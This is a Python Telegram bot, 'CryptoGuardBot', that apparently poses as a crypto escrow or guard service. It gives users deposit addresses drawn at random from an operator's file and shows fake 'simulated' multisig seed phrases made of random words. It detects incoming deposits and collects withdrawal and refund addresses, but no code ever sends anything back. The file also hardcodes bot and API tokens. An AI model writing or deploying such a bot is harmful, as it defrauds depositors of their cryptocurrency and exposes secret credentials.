from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, Filters
import random
import requests
import time

# === CONFIGURATION ===
BOT_TOKEN = "7415463958:AAFB-KIiUvnStRTKcqxnJTEpFonoWjl9FAA"
BLOCKCYPHER_TOKEN = "b4aa61c7eab349bcb23a897c9734b211"  # BlockCypher API Token
BTC_ADDRESS_FILE = "btc_addresses.txt"
ETH_ADDRESS_FILE = "eth_addresses.txt"
ADMIN_ID = 6190128347  # Replace with your Telegram numeric user ID

# === Temporary in-memory storage ===
user_states = {}
refund_addresses = {}
withdrawal_requests = {}
user_data = set()

# === Seed Phrase Generator ===
def generate_seed_phrase():
    with open("english.txt", "r") as f:
        words = f.read().splitlines()
    return " ".join(random.sample(words, 12))

# === Random Address Loader ===
def get_random_address(filename):
    try:
        with open(filename, "r") as f:
            addresses = [line.strip() for line in f if line.strip()]
        return random.choice(addresses) if addresses else None
    except:
        return None

# === Start Command ===
def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_data.add(user_id)
    keyboard = [
        [InlineKeyboardButton("💰 Deposit BTC", callback_data='deposit_btc')],
        [InlineKeyboardButton("💰 Deposit ETH", callback_data='deposit_eth')],
        [InlineKeyboardButton("📜 Guide", callback_data='show_guide')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("Welcome to CryptoGuardBot! Please select an option:", reply_markup=reply_markup)

# === Guide ===
def guide(update: Update, context: CallbackContext):
    guide_text = """
📜 *CryptoGuard Guide* 🚡

1. /start – Begin
2. Choose BTC or ETH
3. Send deposit to provided address
4. Bot will detect the real TX (via blockchain)
5. Set withdrawal address
6. Set refund address (optional)
7. Complete transaction ✅

Contact support for help.
"""
    update.effective_message.reply_text(guide_text, parse_mode="Markdown")

# === Blockchain Polling ===
def check_blockchain_for_tx(address, coin):
    url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
    try:
        res = requests.get(url)
        data = res.json()
        if 'txs' in data:
            for tx in data['txs']:
                if tx.get('confirmations', 0) > 0:
                    value = tx['total'] / 1e8 if coin == 'btc' else tx['total'] / 1e18
                    return tx['hash'], value, tx['confirmations']
    except Exception as e:
        print("Blockchain check error:", e)
    return None, 0, 0

# === Handle Button Clicks ===
def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.answer()

    if query.data == "deposit_btc":
        phrase = generate_seed_phrase()
        btc_address = get_random_address(BTC_ADDRESS_FILE)
        user_states[user_id] = {"coin": "btc", "address": btc_address}
        msg = f"💰 *BTC Deposit Address:* `{btc_address}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your BTC. The bot will detect it automatically."
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "deposit_eth":
        phrase = generate_seed_phrase()
        eth_address = get_random_address(ETH_ADDRESS_FILE)
        user_states[user_id] = {"coin": "eth", "address": eth_address}
        msg = f"💰 *ETH Deposit Address:* `{eth_address}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your ETH. The bot will detect it automatically."
        query.edit_message_text(msg, parse_mode="Markdown")

    elif query.data == "show_guide":
        guide(update, context)

# === /confirm command ===
def confirm(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in user_states:
        update.message.reply_text("Please start a session using /start.")
        return

    coin = user_states[user_id]["coin"]
    address = user_states[user_id]["address"]

    update.message.reply_text("⏳ Verifying your transaction on blockchain...")
    txid, value, conf = check_blockchain_for_tx(address, coin)

    if txid:
        update.message.reply_text(
            f"✅ Transaction detected!\n\n"
            f"*Amount:* {value:.6f} {coin.upper()}\n"
            f"*Confirmations:* {conf}\n"
            f"*TXID:* `{txid}`",
            parse_mode="Markdown")

        update.message.reply_text("Please enter the *withdrawal address*:", parse_mode="Markdown")
        user_states[user_id]["awaiting_withdraw"] = True
    else:
        update.message.reply_text("❌ No confirmed transactions found. Try again later.")

# === Message handler ===
def message_handler(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    msg = update.message.text

    if user_id in user_states:
        state = user_states[user_id]

        if state.get("awaiting_withdraw"):
            withdrawal_requests[user_id] = msg
            state["awaiting_withdraw"] = False
            update.message.reply_text("✅ Withdrawal address saved.")
            update.message.reply_text("Please enter a *refund address* (optional):", parse_mode="Markdown")
            state["awaiting_refund"] = True
            return

        if state.get("awaiting_refund"):
            refund_addresses[user_id] = msg
            state["awaiting_refund"] = False
            update.message.reply_text("✅ Refund address saved. Transaction flow complete!")
            return

# === Admin Dashboard ===
def admin(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("Unauthorized.")
        return

    keyboard = ReplyKeyboardMarkup([
        ["Users", "Deposits"],
        ["Withdrawals", "Refunds"]
    ], resize_keyboard=True)

    update.message.reply_text("👨‍💼 Admin Dashboard\nChoose an option:", reply_markup=keyboard)

def admin_panel_handler(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        return

    text = update.message.text
    if text == "Users":
        update.message.reply_text(f"👤 Total Users: {len(user_data)}")
    elif text == "Deposits":
        update.message.reply_text("Deposit addresses are loaded from file and rotated randomly.")
    elif text == "Withdrawals":
        if not withdrawal_requests:
            update.message.reply_text("No withdrawals yet.")
        else:
            for uid, addr in withdrawal_requests.items():
                update.message.reply_text(f"User {uid}: {addr}")
    elif text == "Refunds":
        if not refund_addresses:
            update.message.reply_text("No refund addresses.")
        else:
            for uid, addr in refund_addresses.items():
                update.message.reply_text(f"User {uid}: {addr}")

# === Main ===
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("guide", guide))
    dp.add_handler(CommandHandler("confirm", confirm))
    dp.add_handler(CommandHandler("admin", admin))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
    dp.add_handler(MessageHandler(Filters.regex("^(Users|Deposits|Withdrawals|Refunds)$"), admin_panel_handler))

    # Start the Bot
    print("Bot is running...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()